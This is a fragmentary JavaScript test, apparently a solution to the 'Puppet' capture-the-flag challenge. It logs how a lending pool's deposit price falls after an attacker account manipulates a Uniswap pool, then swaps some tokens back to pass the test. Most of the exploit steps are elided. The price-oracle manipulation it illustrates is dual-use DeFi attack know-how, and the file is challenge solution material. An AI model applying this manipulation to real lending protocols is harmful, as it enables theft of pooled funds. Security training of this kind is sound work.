...
describe('[Challenge] Puppet', function () {
  ...
  it('Exploit', async function () {
    ...
    const printPrice = async () => {
      const price = await this.lendingPool.calculateDepositRequired(
        POOL_INITIAL_TOKEN_BALANCE
      )

      console.log('   Price to borrow all', price.toString())
    }
    ...
    console.log('\n### After uni pool manipulation ###')
    await printPrice()
    await printAttackerBalances()

    const requiredDeposit = await this.lendingPool.calculateDepositRequired(
      POOL_INITIAL_TOKEN_BALANCE
    )
    ...
    // get a a few tokens back to pass the test
    await this.uniswapExchange
      .connect(attacker)
      .ethToTokenSwapInput(
    ...
    console.log('\n### After Reclaiming some token from uni ###')
    await printPrice()
    await printAttackerBalances()
  })
